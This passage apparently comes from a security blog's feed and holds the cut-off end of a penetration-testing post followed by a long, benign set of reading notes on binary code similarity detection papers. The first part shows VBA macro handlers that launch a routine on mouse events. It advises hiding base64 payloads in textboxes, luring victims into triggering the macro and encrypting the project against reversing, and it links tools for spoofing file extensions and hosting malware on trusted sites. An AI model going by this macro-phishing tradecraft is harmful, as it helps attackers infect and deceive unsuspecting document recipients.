<span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> TextBox2_MouseDown(<span class="keyword">ByVal</span> Button <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> Shift <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> X <span class="keyword">As</span> <span class="type">Single</span>, <span class="keyword">ByVal</span> Y <span class="keyword">As</span> <span class="type">Single</span>)</span><br><span class="line">    <span class="keyword">Static</span> i <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">If</span> i &lt; <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        start</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> TextBox2_MouseMove(<span class="keyword">ByVal</span> Button <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> Shift <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> X <span class="keyword">As</span> <span class="type">Single</span>, <span class="keyword">ByVal</span> Y <span class="keyword">As</span> <span class="type">Single</span>)</span><br><span class="line">    <span class="keyword">Static</span> i <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">If</span> i &lt; <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        start</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>Remember to hide the textbox with base64 codes, and induce victims to trigger the macro when they click&#x2F;hover on some textbox (we can expand it into a whole page to make trigger easier). We can also encrypt the VB project to prevent reversing.</p>
<h2 id="Other-Resources"><a href="#Other-Resources" class="headerlink" title="Other Resources"></a>Other Resources</h2><p>Trusted domains that could be used for hosting malware or etc: <a class="link"   href="https://lots-project.com/" >Living Off Trusted Sites (LOTS) Project<i class="fas fa-external-link-alt"></i></a></p>
<p>A simple program with a graphical user interface to spoof file extensions and icons: <a class="link"   href="https://github.com/henriksb/ExtensionSpoofer" >FileSpoofer<i class="fas fa-external-link-alt"></i></a></p>
<p>Bundle install: <a class="link"   href="https://github.com/TheKingOfDuck/MatryoshkaDollTool" >MatryoshkaDollTool<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.indigorose.com/setup-factory/" >Setup Factory<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/H4de5-7/Bundler-bypass" >Bundler-bypass<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary Code Similarity Detection Papers</title>
    <url>/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/</url>
    <content><![CDATA[<p>There is a repo called <a class="link"   href="https://github.com/SystemSecurityStorm/Awesome-Binary-Similarity" >Awesome Binary Similarity<i class="fas fa-external-link-alt"></i></a> that helps collecting papers.</p>
<p>Here comes my list (including what I’ve read) in alphabetical order.</p>
<h2 id="A-Survey-of-Binary-Code-Similarity"><a href="#A-Survey-of-Binary-Code-Similarity" class="headerlink" title="A Survey of Binary Code Similarity"></a>A Survey of Binary Code Similarity</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/1909.11424.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ACM Computing Survey 2021</th>
</tr>
</thead>
</table>
<p>A survey is sometimes all you need at first.</p>
<p>It analyzes 61 binary code similarity approaches on four aspects: </p>
<ol>
<li>the applications they enable, </li>
<li>their approach characteristics, </li>
<li>how the approaches are implemented, and </li>
<li>the benchmarks and methodologies used to evaluate them.</li>
</ol>
<h2 id="A-Cross-Architecture-Instruction-Embedding-Model-for-Natural-Language-Processing-Inspired-Binary-Code-Analysis"><a href="#A-Cross-Architecture-Instruction-Embedding-Model-for-Natural-Language-Processing-Inspired-Binary-Code-Analysis" class="headerlink" title="A Cross-Architecture Instruction Embedding Model for Natural Language Processing-Inspired Binary Code Analysis"></a>A Cross-Architecture Instruction Embedding Model for Natural Language Processing-Inspired Binary Code Analysis</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/1812.09652.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://cse.sc.edu/~lluo/papers/bar-2019.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://github.com/nlp-code-analysis/cross-arch-instr-model" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NDSS Workshop of BAR 2019</th>
</tr>
</thead>
</table>
<p>Propose to learn the cross-architecture instruction embedding through a <em><strong>joint learning</strong></em> approach, utilizes both the <strong>context concurrence information</strong> present in the instruction sequences from the same architecture, and the <strong>semantically-equivalent signals</strong> exhibited in the instruction sequence pairs from different architectures. </p>
<p>By jointly learning these two types of information, can achieve both the mono-architecture and cross-architecture objectives, and generate high-quality cross-architecture instruction embeddings that capture not only the semantics of instructions within an architecture, but also their semantic relationships across architectures. as a showcase, apply the model to resolving semantics-based basic block similarity comparison.</p>
<p><img src="/./imghost/bcsdp/across.png" alt="A cross-architecture instruction embedding model"></p>
<p><em><strong>System Overview</strong></em>:<br>The approach consists of a <em><strong>mono-architecture</strong></em> component and a <em><strong>multi-architecture</strong></em> component.</p>
<ul>
<li>The <em><strong>mono-architecture</strong></em> component utilizes the <em>context concurrence information</em> present in the input instruction sequences from the same architecture;<br>(an instruction sequence here means a basic block)<br>  <em>CBOW</em> model (<em>word2vec</em>) is adopted due to better performance than <em>skip-gram</em>, predicts current <em>instruction</em> based on its context.</li>
<li>and the <em><strong>multi-architecture</strong></em> component learns the <em>semantically-equivalent signals</em> exhibited in the <em>equivalent instruction sequence pairs</em> from varying architectures.<br>  Still <em>CBOW</em>, while use one arch inst context (<code>ARM</code> insts), to predict target equavilent inst in another arch.</li>
<li>Handle <em>OOV</em> insts: <ul>
<li>replace constant values with <code>0</code>, keep the minus signs.</li>
<li>string literals -&gt; <code>&lt;STR&gt;</code></li>
<li>function names -&gt; <code>FOO</code></li>
<li>other symbol constants -&gt; <code>&lt;TAG&gt;</code></li>
</ul>
</li>
<li>Joint object function: *&amp;)%#%&amp;$@!</li>
</ul>
<h2 id="Asm2Vec-Boosting-Static-Representation-Robustness-for-Binary-Clone-Search-against-Code-Obfuscation-and-Compiler-Optimization"><a href="#Asm2Vec-Boosting-Static-Representation-Robustness-for-Binary-Clone-Search-against-Code-Obfuscation-and-Compiler-Optimization" class="headerlink" title="Asm2Vec: Boosting Static Representation Robustness for Binary Clone Search against Code Obfuscation and Compiler Optimization"></a>Asm2Vec: Boosting Static Representation Robustness for Binary Clone Search against Code Obfuscation and Compiler Optimization</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.computer.org/csdl/proceedings-article/sp/2019/666000a038/19skfc3ZfKo" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://pdfs.semanticscholar.org/38ae/cd9be307867e375b17597499e3e8be2d4930.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.youtube.com/watch?v=6ethsho5uJA&feature=emb_title" >video<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://github.com/McGill-DMaS/Kam1n0-Community" >repo<i class="fas fa-external-link-alt"></i></a> (<a class="link"   href="https://github.com/oalieno/asm2vec-pytorch" >unofficial<i class="fas fa-external-link-alt"></i></a>)</th>
<th>S&amp;P 2019</th>
</tr>
</thead>
</table>
<p>First to employ representation learning, develop Asm2Vec for assembly code syntax and control flow graph, and is is more resilient to code obfuscation and compiler optimizations.</p>
<p>Asm2Vec uses PV-DM neural network (an extension of word2vec), models the control flow grapg as multiple sequences, treats <em>opcodes(operations)</em> and <em>oprands</em> as tokens.</p>
<p><img src="/./imghost/bcsdp/asm2vec.png" alt="The proposed Asm2Vec neural network model for assembly code"></p>
<h2 id="Asteria-Deep-Learning-based-AST-Encoding-for-Cross-platform-Binary-Code-Similarity-Detection"><a href="#Asteria-Deep-Learning-based-AST-Encoding-for-Cross-platform-Binary-Code-Similarity-Detection" class="headerlink" title="Asteria: Deep Learning-based AST-Encoding for Cross-platform Binary Code Similarity Detection"></a>Asteria: Deep Learning-based AST-Encoding for Cross-platform Binary Code Similarity Detection</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/2108.06082v1.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/Asteria-BCSD/Asteria" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>DSN 2021</th>
</tr>
</thead>
</table>
<p>Propose a deep learning-based AST-encoding method, leveraging <em>Tree-LSTM</em> network.</p>
<p>Given a binary, first extract ASTs by decompiling its functions, then preprocess ASTs and encode them into representation vectors using <em>Tree-LSTM</em>, finally combine them as <em>Siamese Network</em> and calculate similarity score.</p>
<p><img src="/./imghost/bcsdp/asteria1.png" alt="System Overview"><br><img src="/./imghost/bcsdp/asteria2.png" alt="Similarity Calculation"></p>
<h2 id="CodeCMR-Cross-Modal-Retrieval-For-Function-Level-Binary-Source-Code-Matching"><a href="#CodeCMR-Cross-Modal-Retrieval-For-Function-Level-Binary-Source-Code-Matching" class="headerlink" title="CodeCMR: Cross-Modal Retrieval For Function-Level Binary Source Code Matching"></a>CodeCMR: Cross-Modal Retrieval For Function-Level Binary Source Code Matching</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://keenlab.tencent.com/zh/whitepapers/neurips-2020-cameraready.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="http://github.com/binaryai/sdk" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NeurIPS 2020</th>
</tr>
</thead>
</table>
<p>Propose an end-to-end cross-model retrieval network for binary source code matching, adopt <em>Deep Pyramid Convolutional Neural Network (DPCNN)</em> for source code feature extraction and <em>Graph Neural Network (GNN)</em> for binary code feature extraction, use neural network-based models to capture code literals, including strings and integers, implement “norm weighted sampling” for negative sampling.</p>
<p><img src="/./imghost/bcsdp/codecmr1.png" alt="The overall framework of CodeCMR"><br><img src="/./imghost/bcsdp/codecmr2.png" alt="Models for embedding"></p>
<h2 id="Codee-A-Tensor-Embedding-Scheme-for-Binary-Code-Search"><a href="#Codee-A-Tensor-Embedding-Scheme-for-Binary-Code-Search" class="headerlink" title="Codee: A Tensor Embedding Scheme for Binary Code Search"></a>Codee: A Tensor Embedding Scheme for Binary Code Search</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://ieeexplore.ieee.org/document/9345532" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://tensorworkshop.github.io/NeurIPS2021/accepted_papers/Codee_Poster_Jia_Yang_26.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://github.com/ycachy/Codee" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>TSE 2021</th>
</tr>
</thead>
</table>
<p>Focus on cross-platform and cross-optimization.</p>
<ol>
<li>modify a skip-gram model with negative sampling to extract <strong>token (opcodes and oprands) representation</strong>.<br><img src="/./imghost/bcsdp/codee3.png" alt="Overview of the token embedding generation scheme"><br>analyze instructions in <em>inter-procedural control flow graph (ICFG)</em>, and use <em>Node2vecWalk</em> to scale the processing time, cz ICFG is much larger than CFG.</li>
<li><strong>basic block embedding</strong> generation is based on 2 network embedding algorithms – <em>AANE</em>, <em>LINE</em>.<br>feed basic block feature vectors and function control flow contextual information, design loss function and use ADMM algorithm.</li>
<li>feed <strong>block embeddings</strong> into tensor to generate <strong>function embeddings</strong>.<br>to facilitate efficient search, use <em>tensor singular value decomposition althorithm (tSVD)</em> to compress <strong>basic block embeddings</strong> into a compact function embedding, and use <em>locality sensitive hash (LSH)</em> to search.<br><img src="/./imghost/bcsdp/codee2.png" alt="Function embedding generation process using tSVD algorithm"><br>If two vectors have the most same values, consider these two vectors to be similar.</li>
</ol>
<p>Tooo much formulas, finally the overview:</p>
<p><img src="/./imghost/bcsdp/codee1.png" alt="Overview of the tensor embedding-based scheme"></p>
<h2 id="DEEPBINDIFF-Learning-Program-Wide-Code-Representations-for-Binary-Diffing"><a href="#DEEPBINDIFF-Learning-Program-Wide-Code-Representations-for-Binary-Diffing" class="headerlink" title="DEEPBINDIFF: Learning Program-Wide Code Representations for Binary Diffing"></a>DEEPBINDIFF: Learning Program-Wide Code Representations for Binary Diffing</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://par.nsf.gov/servlets/purl/10198294" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th><a class="link"   href="https://www.youtube.com/watch?v=TB50csOprMs" >video<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://github.com/ycachy/Codee" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NDSS 2020</th>
</tr>
</thead>
</table>
<p>Propose an unsupervised program-wide code representation learning technique.<br>Rely on both the <strong>code semantic information</strong> and the <strong>program-wide control flow information</strong> to generate basic block embeddings, and propose a <strong>k-hop greedy matching algorithm</strong> to find the optimal diffing results using the generated block embeddings.</p>
<ol>
<li>modify <em>Word2Vec</em> to extract semantic information for <strong>tokens</strong> (opcode and operands), eliminating OOV problem, further assemble basic block level feature vectors which contain <strong>(basic block level) semantic information</strong>.<br>actually <strong>token embedding</strong> belongs to <em>pre-processing</em>, which also includes <strong><em>ICFG</em> extracting</strong>.<br>there are 3 normalization rules:<ul>
<li>numeric const values -&gt; <code>im</code></li>
<li>registers renamed according to length</li>
<li>pointers -&gt; <code>ptr</code><br>use <em>RandomWalk</em> to generate <em>sentence</em> for <em>Word2Vec (CBOW)</em>, then get <strong>opcodes&amp;oprands embeddings</strong> and:</li>
<li>calculate the average of the operand embeddings (maybe within an inst?)</li>
<li>concatenate with the opcode embedding to generate instruction embedding</li>
<li>sum up the instructions within the block to formulate the block feature vector</li>
<li>considering opcodes’ importance, using <em>TF-IDF</em> to learn weights (more weights for ops with stable quantity, this may change due to optimization)</li>
</ul>
</li>
<li>then feed feature vectors into <em>Text-associated DeepWalk algorithm (TADW)</em> to generate basic block embeddings that contain <strong>program-wide control flow contextual information</strong>.<ul>
<li>first do graph merging (but why there’re 2 ICFGs ??? cannot understand so far), creating virtual nodes for strings &amp; libcalls</li>
<li>feed merged graph and bb fea vectors into <em>TADW</em></li>
</ul>
</li>
<li>finally present a k-hop greedy matching algorithm to match basic blocks.<br> explore neighbors of already matched pairs (or initial pairs&#x2F;set), add basic blocks (nodes) having highest similarity with a threshold of 0.6.<br> then use Hungarian algorithm (linear alignment) to find optimal matching.</li>
</ol>
<p>It could be extended to handle cross-architecture using IR …</p>
<p><img src="/./imghost/bcsdp/deepbindiff.png" alt="Overview of DEEPBINDIFF"></p>
<h2 id="Graph-Matching-Networks-for-Learning-the-Similarity-of-Graph-Structured-Objects"><a href="#Graph-Matching-Networks-for-Learning-the-Similarity-of-Graph-Structured-Objects" class="headerlink" title="Graph Matching Networks for Learning the Similarity of Graph Structured Objects"></a>Graph Matching Networks for Learning the Similarity of Graph Structured Objects</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/1904.12787.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/Lin-Yijie/Graph-Matching-Networks" >repo (unofficial)<i class="fas fa-external-link-alt"></i></a></th>
<th>ICML 2019</th>
</tr>
</thead>
</table>
<p>To be continued …</p>
<h2 id="How-could-Neural-Networks-understand-Programs"><a href="#How-could-Neural-Networks-understand-Programs" class="headerlink" title="How could Neural Networks understand Programs?"></a>How could Neural Networks understand Programs?</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/2105.04297.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/pdlan/OSCAR" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>ICML 2021</th>
</tr>
</thead>
</table>
<p>Propose a novel program semantics learning paradigm: model should learn information composed of </p>
<ol>
<li>the <strong>representations</strong> which align well with the <em>fundamental operations</em> in <em>operational semantics</em>,</li>
<li>the <strong>information of environment transition</strong>, which is indispensable for program understanding.</li>
</ol>
<p>Present a hierarchical Transformer-based pre-training model called <strong>OSCAR</strong>, learns from IR and encoded representation derived from static analysis.</p>
<p><img src="/./imghost/bcsdp/howcould.png" alt="An illustration of the model architecture of OSCAR"></p>
<p>hard for me to understand … to be continued …</p>
<h2 id="How-Machine-Learning-Is-Solving-the-Binary-Function-Similarity-Problem"><a href="#How-Machine-Learning-Is-Solving-the-Binary-Function-Similarity-Problem" class="headerlink" title="How Machine Learning Is Solving the Binary Function Similarity Problem"></a>How Machine Learning Is Solving the Binary Function Similarity Problem</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.eurecom.fr/publication/6847/download/sec-publi-6847.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/Cisco-Talos/binary_function_similarity" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>USENIX 2022</th>
</tr>
</thead>
</table>
<p>A systematic measurement study on the state of the art of this research area. </p>
<p>We first explore existing research and group each solution based on the adopted approach, with a particular focus on recent successful techniques based on machine learning.</p>
<p>We then select, compare, and implement the ten most representative approaches and their possible variants.</p>
<p>Based on our analysis, we identified 30 techniques, out of which we then selected ten representative solutions for our study.</p>
<p>The approaches are clustered according to their respective research group.<br><img src="/./imghost/bcsdp/howmachine1.png" alt="approaches clustered according to their respective research group"></p>
<p>The next figure shows instead the timeline of publication on the Y axis, and the different types of input data on the X axis. The approaches are then clustered in three main groups based on the different ways of computing the similarity.<br><img src="/./imghost/bcsdp/howmachine2.png" alt="timeline on the Y axis, and the different types of input data on the X axis"></p>
<p>Briefly describe the ten selected solutions:</p>
<ol>
<li><a class="link"   href="https://www.xorpd.net/pages/fcatalog.html" >Catalog1<i class="fas fa-external-link-alt"></i></a> based on bytes fuzzy hashing.</li>
<li><a class="link"   href="https://googleprojectzero.blogspot.com/2018/12/searching-statically-linked-vulnerable.html" >FunctionSimSearching<i class="fas fa-external-link-alt"></i></a> based on CFG fuzzy hashing.</li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#Neural-Network-based-Graph-Embedding-for-Cross-Platform-Binary-Code-Similarity-Detection">Gemini</a>:Neural network-based graph embedding for cross-platform binary code similarity detection, CCS 2017. based on attributed CFG and GNN.</li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#Graph-matching-networks-for-learning-the-similarity-of-graph-structured-objects">Li et al. 2019</a>: Graph matching networks for learning the similarity of graph structured objects, PMLR 2019. based on attributed CFG, GNN and GMN.</li>
<li><a class="link"   href="https://papers.put.as/papers/ml/2018/zeek.pdf" >Zeek<i class="fas fa-external-link-alt"></i></a>: Binary Similarity Detection Using Machine Learning, PLAS 2018. based on IR, data ﬂow analysis and neural network.</li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#Asm2Vec-Boosting-Static-Representation-Robustness-for-Binary-Clone-Search-against-Code-Obfuscation-and-Compiler-Optimization">Asm2Vec</a>: Asm2Vec: Boosting Static Representation Robustness for Binary Clone Search against Code Obfuscation and Compiler Optimization, IEEE S&amp;P 2019. based on assembly code embedding.</li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#SAFE-Self-Attentive-Function-Embeddings-for-Binary-Similarity">SAFE</a>: Safe: Self-attentive function embeddings for binary similarity, DIMVA 2019. based on ssembly code embedding and self-attentive encoder.</li>
<li><a class="link"   href="https://ruoyuwang.me/bar2019/pdfs/bar2019-paper20.pdf" >Massarelli et al. 2019<i class="fas fa-external-link-alt"></i></a>: Investigating Graph Embedding Neural Networks with Unsupervised Features Extraction for Binary Analysis, BAR（workshop of NDSS）2019. based on Assembly code embedding, CFG and GNN.</li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#CodeCMR-Cross-Modal-Retrieval-For-Function-Level-Binary-Source-Code-Matching">CodeCMR</a>&#x2F;<a class="link"   href="https://github.com/binaryai/sdk" >BinaryAI<i class="fas fa-external-link-alt"></i></a> </li>
<li><a href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/#TREX-Learning-Execution-Semantics-from-Micro-Traces-for-Binary-Similarity">Trex</a>: Trex: Learning execution semantics from micro-traces for binary similarity, arXiv 2020.</li>
</ol>
<p>Show some figures of vulnerability tests.<br><img src="/./imghost/bcsdp/howmachine3.png" alt="Vulnerability test ranks."><br><img src="/./imghost/bcsdp/howmachine4.png" alt="Vulnerability test"></p>
<p>Using unified dataset to evaluate and compare, results show that one machine-learning model, the Graph Matching Networks (<code>GMN</code>) outperforms all the other variants in the six evaluated tasks, achieving performances similar to the less-scalable <code>GMN</code> version.<br><code>Zeek</code>, which is a direct-comparison approach, has higher AUC on large functions. <code>Asm2Vec</code> does not perform any better than other models, and fuzzy hashing approaches are not effective when multiple compilation variables change at the same time.</p>
<h2 id="Hybrid-Firmware-Analysis-for-Known-Mobile-and-IoT-Security-Vulnerabilities"><a href="#Hybrid-Firmware-Analysis-for-Known-Mobile-and-IoT-Security-Vulnerabilities" class="headerlink" title="Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities"></a>Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://par.nsf.gov/servlets/purl/10211514" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>DSN 2021</th>
</tr>
</thead>
</table>
<p>A hybrid, <em>cross-platform</em> binary code similarity analysis that combines deep learning-based static binary analysis with dynamic binary analysis.</p>
<p>Approach – implemented in three steps:</p>
<ol>
<li>deep learning is used to train the vulnerability detector;<br> including 48 features.<br> adapt a sequential model that is composed of a linear stack of layers(6-layer).</li>
<li>the vulnerability detector is used to statically analyze the target mobile&#x2F;IoT firmware; </li>
<li>the identified vulnerable subroutines are run for in-depth dynamic analysis and verification of the existence of a vulnerability.<br> extract 21 dynamic features from execution traces, and use Minkowski distance as similarity measures.<ul>
<li>use fuzzing to generate multiple inputs (use DLL binary injection to create execution environment) for target function to boost coverage</li>
<li>remove executions with system exceptions or sth. else</li>
<li>instrument (DLL binary injection) and remote debugging</li>
</ul>
</li>
</ol>
<p>The analyses use the extracted static and dynamic features of <em>vulnerable</em> and <em>patched</em> functions, comparing similarity between them respectively, to identify whether the candidate vulnerability function has been patched.</p>
<p><img src="/./imghost/bcsdp/hybrid.png" alt="PATCHECKO vulnerability and patch search workflow"></p>
<h2 id="In-Memory-Fuzzing-for-Binary-Code-Similarity-Analysis-–-ASE-2017"><a href="#In-Memory-Fuzzing-for-Binary-Code-Similarity-Analysis-–-ASE-2017" class="headerlink" title="In-Memory Fuzzing for Binary Code Similarity Analysis – ASE 2017"></a>In-Memory Fuzzing for Binary Code Similarity Analysis – ASE 2017</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://faculty.ist.psu.edu/wu/papers/IMF.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ASE 2017</th>
</tr>
</thead>
</table>
<ul>
<li><p>fuzzing module<br>  in-memory fuzzing to execute and record behaviors<br>  behaviors&#x2F;features:</p>
<ol>
<li>value of heap reads&#x2F;writes</li>
<li>memory address offsets for reading <code>.plt.got</code>        </li>
<li>memory address offsets for reading <code>.rodata</code></li>
<li>memory address offsets for reading&#x2F;writing <code>.data</code></li>
<li>memory address offsets for reading&#x2F;writing <code>.bss</code></li>
<li>system calls</li>
<li>memory address offsets for accesing <code>v_mem1</code> and <code>v_mem2</code>(they are created for reducing pointer related memory access errors)</li>
<li>function return value<br>  actually <code>12</code> features (<code>8</code> types)</li>
</ol>
<p>  heap value is better than offset, for different allocation strategies<br>  memory value might be less important (many zero bytes) than memory address offset</p>
</li>
<li><p>taint analysis module<br>  but. lack of data type info (data or pointer), so using <code>backward taint analysis</code> to recover pointer errors (figure out <code>root</code> of a pointer data flow)</p>
<p>  not like “in-place” strategy, just update memory access through an illegal adress with a valid address, without finding the root cause.<br>  if update <code>root</code> with valid pointer, then no need for later replacement,and it can record useful behavior.</p>
<p>  whole process starts from a given pointer reference error, first locate registers which should return valid value (using Pin API get_base_register), then backwarding to closest taint reg&#x2F;memory unit to source as sink.</p>
</li>
<li><p>similarity analysis module<br>  concatenate behavior traces by kinds, and for a trace consisting of same kind of behaviors, calculate jaccard index rate</p>
<ol>
<li>We note that since Longest Common Subsequence (LCS) allows skipping non-matching elements, it naturally tolerates diverse or noise on the behavior traces due to program optimizations or even obfuscations.</li>
<li>a Jaccard index(s) is derived from the LCS(s) of two traces – many Jaccard indexes compose a vector.</li>
</ol>
</li>
<li><p>machine learning module<br>  for a given <code>f1</code> in <code>bin1</code>, find its matched function(<code>f2</code>) in <code>bin2</code><br>  tree-based model (e.g. Extra-Trees)</p>
</li>
</ul>
<p><img src="/./imghost/bcsdp/inmemory.png" alt="The workflow of IMF-SIM"></p>
<h2 id="Neural-Machine-Translation-Inspired-Binary-Code-Similarity-Comparison-beyond-Function-Pairs"><a href="#Neural-Machine-Translation-Inspired-Binary-Code-Similarity-Comparison-beyond-Function-Pairs" class="headerlink" title="Neural Machine Translation Inspired Binary Code Similarity Comparison beyond Function Pairs"></a>Neural Machine Translation Inspired Binary Code Similarity Comparison beyond Function Pairs</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_11-4_Zuo_paper.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.ndss-symposium.org/wp-content/uploads/ndss2019_11-4_Zuo_slides.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.youtube.com/watch?v=-BeqwMPQNrw&list=PLfUWWM-POgQvnPOa9Bo1AyKplMkOGfHUT&index=5&t=1s" >video<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://nmt4binaries.github.io/" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NDSS 2019</th>
</tr>
</thead>
</table>
<p>This work thus borrows ideas from NLP to address two important code similarity comparison problems:</p>
<ol>
<li>given a pair of basic blocks of different instruction set architectures(ISA), determining whether their semantic is similar (<strong>equivalence</strong>)</li>
<li>given a piece of code of interest, determining if it is contained in another piece of code of a different ISA (<strong>containment</strong>), propose <em><strong>INNEREYE</strong></em></li>
</ol>
<p>Inspired by neural machine translation, regard instructions as words and basic blocks as sentences, propose a cross-(assembly)-lingual deep learning approach, do <em>basic block embedding</em>.</p>
<p>Solution to prob.1:     use NMT idea to do embedding, then measure distance<br>Solution to prob.2:     decompose CFG into multiple paths – sequences of blocks, and apply <em>LCS</em></p>
<p>examine code component semantics at three layers:</p>
<ul>
<li>basic blocks: design the <strong>neural network-based cross-lingual basic-block embedding model</strong> to represent a basic block as an embedding, store in <em>LSH database</em> for searching.<br>  adopt a <em>Siamese arch with each side employing LSTM</em><br>  as for <em>instruction embedding</em>, using <em>skip-gram</em></li>
<li>CFG paths: use <em>LCS</em> to compare paths’ semantic similarity</li>
<li>code components: explore multiple path pairs to collectively calculate a similarity score</li>
</ul>
<p><img src="/./imghost/bcsdp/neuralmachine.png" alt="System architecture"></p>
<p>rich in evaluation and experiments, to be continued …</p>
<h2 id="Neural-Network-based-Graph-Embedding-for-Cross-Platform-Binary-Code-Similarity-Detection"><a href="#Neural-Network-based-Graph-Embedding-for-Cross-Platform-Binary-Code-Similarity-Detection" class="headerlink" title="Neural Network-based Graph Embedding for Cross-Platform Binary Code Similarity Detection"></a>Neural Network-based Graph Embedding for Cross-Platform Binary Code Similarity Detection</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/1708.06525.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/Yunlongs/Genimi" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>CCS 2017</th>
</tr>
</thead>
</table>
<p>Propose <em><strong>Gemini</strong></em>, statistical (manually selected) features as basic block representation to buile ACFG for each function, use struc2vec (graph embedding) to combine a Siamese architecture (calculating similarity).</p>
<p><img src="/./imghost/bcsdp/neuralnetwork2.png" alt="An example of a code graph on Function `dtls1_process_heartbeat` (Heartbleed vulnerability)"><br><img src="/./imghost/bcsdp/neuralnetwork1.png" alt="Graph Embedding Network"><br><img src="/./imghost/bcsdp/neuralnetwork3.png" alt="Siamese Architecture"></p>
<h2 id="Order-Matters-Semantic-Aware-Neural-Networks-for-Binary-Code-Similarity-Detection"><a href="#Order-Matters-Semantic-Aware-Neural-Networks-for-Binary-Code-Similarity-Detection" class="headerlink" title="Order Matters: Semantic-Aware Neural Networks for Binary Code Similarity Detection"></a>Order Matters: Semantic-Aware Neural Networks for Binary Code Similarity Detection</h2><table>
<thead>
